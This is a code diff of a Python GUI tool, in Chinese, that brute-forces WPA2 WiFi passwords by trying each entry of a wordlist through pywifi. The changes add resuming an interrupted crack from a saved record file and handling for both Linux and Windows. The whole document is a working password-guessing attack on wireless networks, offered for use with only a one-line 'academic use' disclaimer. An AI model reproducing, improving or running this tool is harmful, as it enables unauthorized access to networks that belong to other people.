@@ -8,10 +8,11 @@ import time
 import tkinter.filedialog
 import tkinter.messagebox
 import threading
+import platform
 
 # 当前版本存在的问题：
 # 无法破解带有特殊字符的wifi 如 希腊字母、日语等，还有 < > 这种符号
-# 需要手动修改 profile.akm的赋值方式，windows用的是=，linux用的是append
+# 没有排除纯数字或者纯字母的密码，在新时代的安全要求下，将会有很多多余的尝试
 
 # 创建一个类，继承自listbox，写一个同时执行插入和查看最后一行的操作
 class Log_Listbox(Listbox):
@@ -33,6 +34,8 @@ class MY_GUI():
         self.waitime = IntVar(value=5)                                    # 连接等待时长
         self.codeSet = False                                              # 默认不使用特殊编码
         self.exclude = True                                               # 默认排除长度小于8的密码
+        self.pwdNow = None                                                # 当前尝试密码
+        self.codeBook = None                                              # 当前密码本
 
     def usefuc(self):
         how_to_use = Toplevel(master=self.myWindow)
@@ -44,7 +47,7 @@ class MY_GUI():
         how_to_use.focus_get()
         mytext = Text(how_to_use, wrap=WORD, width=40, height=22)
         mytext.pack()
-        content = "1、本工具仅用于学术交流和实验使用。\n\n2、本工具通过WIFI名称和密码本对同一WIFI进行重复连接, 直到连接成功或密码本穷尽。\n\n3、点击搜索附近WIFI可以找到多个WIFI并在WIFI列表中显示, 此时双击WIFI列表中的一项, 即可填充WIFI名称, 当然也可以手动填写。\n\n4、文件路径用于填写密码文件路径, 可以通过旁边的添加按钮选择文件。\n\n5、WIFI密码, 可以填写正确的WIFI密码, 该密码可以用于测试连接, 测试得到的连接速度会自动填充到下方的连接等待时长。破解成功时WIFI密码也会填充到此处。\n\n6、连接等待时长, 指的是连续尝试两个密码的时间间隔, 如果时间间隔过短, 容易因为提前中断而跳过正确密码, 因此该时间应当适量延长。\n\n7、运行日志会在下方显示, 方便检查错误或者用于确定程序还在运行。\n"
+        content = "1、本工具仅用于学术交流和实验使用。\n\n2、本工具通过WIFI名称和密码本对同一WIFI进行重复连接, 直到连接成功或密码本穷尽。\n\n3、点击搜索附近WIFI可以找到多个WIFI并在WIFI列表中显示, 此时双击WIFI列表中的一项, 即可填充WIFI名称, 当然也可以手动填写。\n\n4、文件路径用于填写密码文件路径, 可以通过旁边的添加按钮选择文件。\n\n5、WIFI密码, 可以填写正确的WIFI密码, 该密码可以用于测试连接, 测试得到的连接速度会自动填充到下方的连接等待时长。破解成功时WIFI密码也会填充到此处。\n\n6、连接等待时长, 指的是连续尝试两个密码的时间间隔, 如果时间间隔过短, 容易因为提前中断而跳过正确密码, 因此该时间应当适量延长。\n\n7、运行日志会在下方显示, 方便检查错误或者用于确定程序还在运行。\n\n8、如果在尝试密码的过程中关闭程序, 程序会自动记录当前的密码本和尝试的密码到Crack.record文件, 下次使用该程序就可以在选择密码本时, 选择该文件, 点击开始破解时, 程序会从上次的记录开始破解。\n\n"
         mytext.insert(END, content)
 
     def notice(self):
@@ -79,7 +82,11 @@ class MY_GUI():
         # ********* 窗口配置 ********
         self.myWindow.title("WIFI破解工具")
         w, _ = self.myWindow.maxsize()
-        self.myWindow.geometry(f'550x630+{(w - 550)//2}+0')
+        sys = platform.system()
+        width = 540
+        if sys == 'Linux':
+            width = 600
+        self.myWindow.geometry(f'{width}x630+{(w - 550)//2}+0') # 如果是linux，宽度540应改为600
 
         # ********* 顶部菜单栏 **********
         myMenu = Menu(self.myWindow)
@@ -138,22 +145,26 @@ class MY_GUI():
         Label(labelframe, text='连接等待时长: ').grid(column=0, row=3, pady=24)
         Entry(labelframe, width=22, textvariable=self.waitime).grid(column=1, row=3)
 
-        Label(labelframe, text='在一定范围内，等待时间越长, 连接上的机会越大.', font=('', 9), fg='red').place(x=0, y=170)
+        Label(labelframe, text='等待时间在一定范围内越长, 连接上的机会越大.', font=('', 9), fg='red').place(x=0, y=170)
 
         # ********* 运行日志 **********
         listframe = LabelFrame(self.myWindow, text='运行日志')
         listframe.grid(column=0, row=2, padx=10, pady=5, sticky=(W, E, N, S))
 
         self.mylog = Log_Listbox(listframe, width=70, height=6)
-        self.mylog.grid(column=0, row=0, padx=3, pady=3, sticky=W)
+        self.mylog.grid(column=0, row=0, padx=3, pady=3, sticky=(W, N, S))
         vbar = ttk.Scrollbar(listframe, orient=VERTICAL, command=self.mylog.yview)
+        self.mylog.config(yscrollcommand=vbar.set)      # 绑定滚动条回调，使日志增多时可以自动缩短滚动条长度
         vbar.grid(row=0, column=1, sticky=(N, S))
+
+        self.myWindow.protocol("WM_DELETE_WINDOW", self.delete)
 
     # 创建子线程后台运行，需要使用 lambda 延迟该函数执行
     def work_in_back(self, func, *args):
         # 设置保护线程，程序关闭时同时关闭所有子线程
         threading.Thread(target=func, args=args, daemon=True).start()  
-        
+    
+    # 扫描附近的wifi并展示到窗口
     def scans_wifi_list(self):
         self.iface.disconnect()  # 测试链接断开所有链接
         time.sleep(1)  # 休眠1秒
@@ -163,6 +174,7 @@ class MY_GUI():
         scanres = self.iface.scan_results()
         self.show_scans_wifi_list(scanres)
 
+    # 展示wifi结果
     def show_scans_wifi_list(self, scans_res):
         # 清空原有结果
         for i in self.wifi_tree.get_children():
@@ -176,18 +188,26 @@ class MY_GUI():
             self.wifi_tree.insert("", 'end', values=(index + 1, ssid, wifi_info.bssid, wifi_info.signal))
         self.mylog.insert_and_see(f"搜索完成.")
 
+    # 添加密码本
     def add_pwd_file(self):
-        filename = tkinter.filedialog.askopenfilename()
-        if filename:
-            self.get_value.set(filename)
-            self.mylog.insert_and_see(f"已加载文件 {filename}.")
+        self.codeBook = tkinter.filedialog.askopenfilename()
+        if "Crack.record" in self.codeBook:
+            with open(self.codeBook, 'r') as f:
+                record = f.read().split()
+                self.codeBook = record[0]
+                self.pwdNow = record[1]
+        if self.codeBook:
+            self.get_value.set(self.codeBook)
+            self.mylog.insert_and_see(f"已加载文件 {self.codeBook}.")
 
+    # 点击wifi的事件处理
     def onDBClick(self, event):
         for item in self.wifi_tree.selection():
             item_text = self.wifi_tree.item(item, "values")
             self.get_wifi_value.set(item_text[1])  # 填充选中的WiFi账号
             self.mylog.insert_and_see(f"已选择wifi {item_text[1]}")
 
+    # 测试连接
     def testConnect(self):
         self.iface.disconnect()  # 测试链接断开所有链接
         
@@ -201,7 +221,6 @@ class MY_GUI():
             return
         
         self.mylog.insert_and_see(f"正在尝试密码 {wifi_pwd}...")
-        import time
         start = time.time()
         if self.connect(wifi_pwd, wifi_ssid):
             end = time.time()
@@ -209,7 +228,8 @@ class MY_GUI():
             self.waitime.set(int(end - start) + 1)
         else:
             self.mylog.insert_and_see('连接失败, 请检查密码是否正确.')
-        
+    
+    # 开始破解
     def startCrack(self):
         filePath = self.get_value.get()
         wifi_ssid = self.get_wifi_value.get()
@@ -231,30 +251,41 @@ class MY_GUI():
             self.mylog.insert_and_see(e)
             encoding='utf-8'
 
+        skip = True   # 跳过已尝试密码的标志
         with open(filePath, "r", errors="ignore", encoding=encoding) as pwd_file:
-            for pwd in pwd_file:
-                if len(pwd.strip()) < 8 and self.exclude:    # 自动排除字符长度小于 8 的密码
+            for pwd in pwd_file:    # 逐行处理防止爆内存
+                if skip and self.pwdNow and pwd.strip() != self.pwdNow:     # 跳过之前已经尝试过的密码
+                    continue
+                elif self.pwdNow and pwd.strip() == self.pwdNow:    # 找到上次记录的密码后，修改标记，
+                    skip = False
+                self.pwdNow = pwd.strip()
+                if len(self.pwdNow) < 8 and self.exclude:    # 自动排除字符长度小于 8 的密码
                     continue
                 # 每次循环都应该单独设置一个异常检测，防止因为其中一个密码导致的错误使程序停止运行
                 try:
-                    self.mylog.insert_and_see(f"正在尝试密码 {pwd.strip()}...")
-                    if self.connect(pwd.strip(), wifi_ssid, crack=True):
+                    self.mylog.insert_and_see(f"正在尝试密码 {self.pwdNow}...")
+                    if self.connect(self.pwdNow, wifi_ssid, crack=True):
                         self.get_wifipwd_value.set(pwd.strip())
-                        self.mylog.insert_and_see(f'破解成功，密码：{pwd.strip()}')
+                        self.mylog.insert_and_see(f'破解成功，密码：{self.pwdNow}')
                         self.mylog.insert_and_see(f"正确密码已写入输入框, 有需要可复制.")
-                        tkinter.messagebox.showinfo('提示', f"密码 : {pwd.strip()}")
+                        tkinter.messagebox.showinfo('提示', f"密码 : {self.pwdNow}")
                         return
                 except Exception as e:
                     self.mylog.insert_and_see(e)
             self.mylog.insert_and_see('破解失败，尝试所有密码均不匹配！')
             tkinter.messagebox.showinfo('提示', '破解失败，尝试所有密码均不匹配！')
 
+    # 尝试使用一个密码连接对应名称的wifi
     def connect(self, pwd_str, wifi_ssid, crack=False):
         profile = pywifi.Profile()
         profile.ssid = wifi_ssid
         profile.auth = const.AUTH_ALG_OPEN
-        profile.akm = const.AKM_TYPE_WPA2PSK
-        # profile.akm.append(const.AKM_TYPE_WPA2PSK) # linux 可能需要该语句
+
+        if isinstance(profile.akm, int):
+            profile.akm = const.AKM_TYPE_WPA2PSK  # Windows 底层C框架可能限制整型
+        elif isinstance(profile.akm, list):
+            profile.akm.append(const.AKM_TYPE_WPA2PSK) # Linux 宽松一点可以使用 append
+
         profile.cipher = const.CIPHER_TYPE_CCMP
         profile.key = pwd_str
         self.iface.remove_all_network_profiles()
@@ -284,7 +315,12 @@ class MY_GUI():
             if self.iface.status() == const.IFACE_CONNECTED:
                 time.sleep(2)   # 一般在连接成功后的两秒内会保持稳定连接或断开连接
                 return True
-
+            
+    def delete(self):
+        if self.pwdNow and self.codeBook:
+            with open('Crack.record', 'w') as f:
+                f.write(f"{self.codeBook} {self.pwdNow}")
+        self.myWindow.destroy() # 手动销毁窗口
 
 def gui_start():
     init_window = Tk()
